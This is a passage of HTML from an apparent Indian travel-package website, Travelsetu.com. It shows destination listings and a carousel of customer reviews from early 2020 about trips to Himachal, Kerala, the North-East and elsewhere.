                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/maldives" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Maldives.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/maldives"><h4 class="box-title">Maldives </h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/mauritius" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Mauritius.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/mauritius"><h4 class="box-title">Mauritius</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/singapore" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Singapore.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/singapore"><h4 class="box-title">Singapore</h4></a>
                        </div>
                      </article>
                    </li>
                        <li>
                      <article class="box">
                        <figure class="animated" data-animation-type="fadeInDown" data-animation-duration="1" data-animation-delay="0.3">
                          <a href="https://travelsetu.com/holiday-tour-packages/thailand" class="hover-effect"><img src="https://travelsetu.com/crm/images/destination_image/Thailand.jpg" style="height:150px !important;" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/thailand"><h4 class="box-title">Thailand</h4></a>
                        </div>
                      </article>
                    </li>
                      </ul>
                </div>
              </div>
            </div>

            <div class="honeymoon section global-map-area promo-box parallax" data-stellar-background-ratio="0.5">
              <div class="container">
                <div class="col-sm-6 content-section description pull-right">
                  <h2 class="title">Popular Destinations for Honeymoon</h2>
                  <div class="row places image-box style9">
                        <div class="col-sms-4 col-sm-4">
                      <article class="box">
                        <figure>
                          <a href="https://travelsetu.com/holiday-tour-packages/himachal" title="" class="hover-effect yellow middle-block animated" data-animation-type="fadeInUp" data-animation-duration="1"><img src="https://travelsetu.com/crm/images/destination_image/Himachal.jpg" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/himachal"><h4 class="box-title">Himachal</h4></a>
                        </div>
                      </article>
                    </div>
                        <div class="col-sms-4 col-sm-4">
                      <article class="box">
                        <figure>
                          <a href="https://travelsetu.com/holiday-tour-packages/kerala" title="" class="hover-effect yellow middle-block animated" data-animation-type="fadeInUp" data-animation-duration="1"><img src="https://travelsetu.com/crm/images/destination_image/Kerala.jpg" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/kerala"><h4 class="box-title">Kerala</h4></a>
                        </div>
                      </article>
                    </div>
                        <div class="col-sms-4 col-sm-4">
                      <article class="box">
                        <figure>
                          <a href="https://travelsetu.com/holiday-tour-packages/rajasthan" title="" class="hover-effect yellow middle-block animated" data-animation-type="fadeInUp" data-animation-duration="1"><img src="https://travelsetu.com/crm/images/destination_image/Rajasthan.jpg" alt="" /></a>
                        </figure>
                        <div class="details">
                          <a title="View Package List" href="https://travelsetu.com/holiday-tour-packages/rajasthan"><h4 class="box-title">Rajasthan </h4></a>
                        </div>
                      </article>
                    </div>
                      </div>
                </div>
                <div class="col-sm-6 image-container no-margin">
                  <img src="https://travelsetu.com/holiday-tour-packages/images/me/index/couple.png" alt="" class="animated" data-animation-type="fadeInUp" data-animation-duration="2">
                </div>
              </div>
            </div>

            <div class="offers section" style="padding:0px;">
              <div class="container">
                <h2 class="text-center">About Travelsetu.com</h2>
                <p class="col-xs-9 center-block no-float text-center">TravelSetu.com, a one stop travelling solution. TravelSetu is like a connecting bridge between travelers and travelling companies, we help you find the travel packages that perfectly suit what you're looking for and it is as easy as ONE TWO THREE!</p>

                <div class="destinations">
              <div class="container">
                <div class="image-carousel style2" data-animation="slide" data-item-width="570" data-item-margin="30">
                  <ul class="slides image-box listing-style2">
                        <li>
                      <h3 class="s-title">Review from Deepali  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Apr 2020</small></h5>
                      <p style="margin:0px;">Due to lockdown this trip is not happened . Please initiate the refund </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Himanshu jaiswal  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Mar 2020</small></h5>
                      <p style="margin:0px;">Mam I am not going trip <br />
    By indias lockdown<br />
    Am going from <br />
    After14th April<br />
    <br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Raghavendra  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;20th, Mar 2020</small></h5>
                      <p style="margin:0px;">Himalayan travels was really very friendly and co-operative and very quickly responded to all requests in a very short notice. I definitely recommend Himalayan travels.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Saswati Ray   for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Mar 2020</small></h5>
                      <p style="margin:0px;">Our journey to Sikkim with Trips and Trekks was one of the unforgettable journey... The accommodation, the food, the tours conducted by them and obviously the support and guidance  given by Mr Shubhayan was superb.. He was available for us 24hrs throughout our journey. Though we did not face any inconvenience or difficulties in our journey but for any queries and any help he was always available... It's was great to get a tour coordinator like him. With the hospitality we experienced from Trips and Trekks and from Mr Shubhayan,  we planning for our next trip with them soon. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shikha kapoor  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Mar 2020</small></h5>
                      <p style="margin:0px;">Well organized trip..thanks duniya zamana..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jitendra kumar  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Mar 2020</small></h5>
                      <p style="margin:0px;">I lkie travel Setu .travel setu is excellent service. So wonderful trip.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Minal  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Mar 2020</small></h5>
                      <p style="margin:0px;">Trip planned was very amazing.  Mr.Nitin was very cooperative and helpful throughout our journey; he kept strong follow up with us till the end of our trip. <br />
    Hotels and camps provided were nice and clean.  <br />
    Looking forward to make more trips with Tourist traingle in future. <br />
    Strongly recommend Tourist Triangle for planning any trip especially in North India.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Akshay Patil  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;5th, Mar 2020</small></h5>
                      <p style="margin:0px;">That was a great experience and good service by local guide.<br />
    Thanks Travelsetu</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Hemant  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Feb 2020</small></h5>
                      <p style="margin:0px;">It was a really a good tour package with Travel Setu and travel Mahavir tour travels Shimla.Every thing was organised properly .We whole family enjoyed trip very much. Especially we thanks to Mahavir tour travels, Miss Nikitathakur who has coordinated with us during whole trip . If in our future if we plan for any tour program I will give you the 1st preference & also suggest my friend or relative to give you a chance if they plan for tour</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Patel moulik  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Feb 2020</small></h5>
                      <p style="margin:0px;">We had a fantastic trip.thanks to mahavir tour & travels for arranging smooth travel experience.special thanks to Nikita</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Abhinav Gour  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Feb 2020</small></h5>
                      <p style="margin:0px;">It is a very good travel agency. I had planned shimla manali honeymoon trip with this agency. I can say its value for money service for me. Nikita mam's nature is fabulous . She always speaks politely in any situation. If you are planning to travel himachal this may be best travel agency for you. I strongly recommend it for great & economical service.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from VIRAJ NANDGAONKAR  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Feb 2020</small></h5>
                      <p style="margin:0px;">Thanks Abhimanyu For The Wonderful Package And You Stay On Your Promises #Best Time In Kerala Everything Was Good </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Lipika  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;22nd, Feb 2020</small></h5>
                      <p style="margin:0px;">Me and my friends booked a tour of Sikkim and Darjeeling.Sourav Debnath was our travel agent.He is the most cooperative agent i hve met. The way he planned and organised everything surely deserves 5 stars. From hotels to transportation. <br />
    The best experience was trip to Lachung. And our driver was amazing. He entertained us whole trip. I would recommend u guys to ask for the same driver if possible. <br />
    The only problem we faced was tht we were not provided with room heaters in Lachung. <br />
    Rest everything was as per expectation.<br />
    Thank u Sourav Ã¢ËœÂº</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jenish   for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;16th, Feb 2020</small></h5>
                      <p style="margin:0px;">nice and good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Parth  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Feb 2020</small></h5>
                      <p style="margin:0px;">https://www.complaintboard.in/complaints-reviews/travel-setu-https-travelsetu-com-l821446.html</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Yogendra Singh  for Kashmir trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Feb 2020</small></h5>
                      <p style="margin:0px;">Superb services by Honor travels. Fantastic properties and food arrangements made by Ms. Baiza. Truly professional and customer friendly. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Jayanth  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;14th, Feb 2020</small></h5>
                      <p style="margin:0px;">everything was good</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from VAIBHAV  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Feb 2020</small></h5>
                      <p style="margin:0px;">I have an awesome experience with Maxis holiday. Mr (Gulab Singh) our trip introducer Makes my journey very enjoyable. I never feel any kind of trouble during my trip. They provide me very neat and clean hotels as prescribed me earlier. The details provided to me before my trip was very much accurate.They provide us driver Mr Anthony is such a nice guy. He done his work very efficiently. We like to gave them Next chance also in future.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from nijar  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;7th, Feb 2020</small></h5>
                      <p style="margin:0px;">Overall trip was very good. First i thanks to duniyazaman amrita. She was arranged my Kerala trip for 5days and 4nights on January 2020. Diamond hills hotel Munnar and LP House boat Alleppey is very nice. But in Thekkady Periyar nest hotel only i disappointed. Otherwise cab driver mr. Venu gobal sir is very good drive. Thanks to duniyazaman agent.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Shiva  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;2nd, Feb 2020</small></h5>
                      <p style="margin:0px;">Overall trip was very good received a great support from Abhimanyu</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Zahid  for Kerala trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;1st, Feb 2020</small></h5>
                      <p style="margin:0px;">Thank you Maxis for a hassle free and a memorable trip. Best wishes and regards.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Prathamesh Bhusari  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;1st, Feb 2020</small></h5>
                      <p style="margin:0px;">Trip was good. Hotel stays and tempo traveller was good. Driver was cooperative.  Only dinner menu was limited and same at every stay should have some more variety. Looking forward to have more trips with tourist triangle.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Gohil Yogesh  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;31st, Jan 2020</small></h5>
                      <p style="margin:0px;">Really very good memorable trip to  Manali - Dharamshala- Dalhousie- and Amritsar organized by My Trip My Way Shimla we are very much satisfied with the organization and the person in contact Mr.Hitesh sharma or Mr. Jagdish Service the most friendly tour adviser ever had, right from the thinking of the tour till the day we reach our home he was in touch with me, and about the management - right from the start pickup it was awesome, the vehicle and driver were up to mark, Hotels organized were great, hotel staff were very helpful, food was great both hotels, Everything was great,  Cheers to the whole tour's management for being so delightful and making the trip so cheerful for us, and the best thing was no hidden charges, we paid only in shopping, definitely the best tour organizer in India, and surely you will be our organizer in future every tour.Thanxs My trip My way .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Manish pal  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Jan 2020</small></h5>
                      <p style="margin:0px;">They provide me best services in cheapest price...i recommend to all please book tour packages from tourist triangle..</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ABHIJEET  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Jan 2020</small></h5>
                      <p style="margin:0px;">Tourist traingle is one the best for tours in north, the accomodation and travel was available in much reasonable price. Mr Nitin was very helpful and he was in touch with us throughout the trip. Every small request was fulfilled with in no time. Thank you Nitin sir and travel setu.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from rahul kadam  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;28th, Jan 2020</small></h5>
                      <p style="margin:0px;">Good Package</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ramanuj  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Jan 2020</small></h5>
                      <p style="margin:0px;">Deducting few point because of lack of co-ordination between different teams and nonetheless trip was good. I will definitely going to recommend TRIPS N TREKKS to friend.<br />
    <br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Arpit  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Jan 2020</small></h5>
                      <p style="margin:0px;">Good communication and nice service provider</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ANVIN  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Jan 2020</small></h5>
                      <p style="margin:0px;">Very Good </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Rafakat  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;27th, Jan 2020</small></h5>
                      <p style="margin:0px;">An amazing trip. Thanks to all those who made this happen. Especially the travel agent who helped in getting all my concerns rectified as soon as its raised .</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from gs ravikumar  for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;26th, Jan 2020</small></h5>
                      <p style="margin:0px;">Tour are so good . and good services for travel agencies . Yes Tourism Special Thanks for Tim Leader Virat ji and Ms Kriti Chamling Rai.good hotel are provided and taxi driver are communication are good . </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sagar  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;25th, Jan 2020</small></h5>
                      <p style="margin:0px;">Nice</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Abhishek   for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Jan 2020</small></h5>
                      <p style="margin:0px;">Well managed</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Adnan  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;24th, Jan 2020</small></h5>
                      <p style="margin:0px;">Zara resort 3rd class service please change the hotel fully worst resort.</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Karankoul  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;21st, Jan 2020</small></h5>
                      <p style="margin:0px;">Its an awesome experience with our planner karan kaul ... we all enjoy alot nd explore the whole manali ... its an awesome experience only because of our planner karan kaul ... thanks karan </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Yuktha  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i>					  (5)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;19th, Jan 2020</small></h5>
                      <p style="margin:0px;">The whole trip was awesome.<br />
    They give the best out of them.<br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sumit  for Bhutan trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;18th, Jan 2020</small></h5>
                      <p style="margin:0px;">Very good tour and travel agency(Yes Tourism India) Based on their very positive reviews, we booked a 8-day Bhutan tour in very reasonable cost for 3people. I found the service and response of this travel agency to be excellent. Also I would like to thanks Sushmita Ghosh a trip advisor of this agency who helped and guide a lot to the whole trip. I personally recomend to all can book trips from Yes Tourism India for awesome travel experience. </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Ashok  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.8)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;17th, Jan 2020</small></h5>
                      <p style="margin:0px;">My concern person NITIN from tourist triangle was very good all credit goes to NITIN trip also ok some places hotel and cab service was not good but NITIN coordination cover all problem</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from ABHISHEK KUMAR for North-East trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-half-o star"></i>					  (4.6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Jan 2020</small></h5>
                      <p style="margin:0px;">The tour was well-organized, the tour director was friendly and knowledgeable, the driver for this trip was informative and made he available if we had any issues. the staffs were very friendly and always ready to answer all my questions & phone calls.<br />
    THANKS TO TRIP-N-TREKKS WE WILL REFER IN FUTURE <br />
    </p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Harsh  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;15th, Jan 2020</small></h5>
                      <p style="margin:0px;">Its a good trip <br />
    Hotels are also gud  kalpana cottage and rajat hotel <br />
    (Mohan palace is worst hotel  i have seen ever)<br />
    Except this everything is good in this trip ...... <br />
    Thanks upasana maam and neha ... For trip advisor</p>
                    </li>
                        <li>
                      <h3 class="s-title">Review from Sneha  for Himachal trip.</h3>
                      <h5 class="name" style="margin:0px;">
                          <i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star star"></i><i class="fa fa-star-o star"></i>					  (4)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<small><i class="fa fa-calendar "></i>&nbsp;&nbsp;13th, Jan 2020</small></h5>
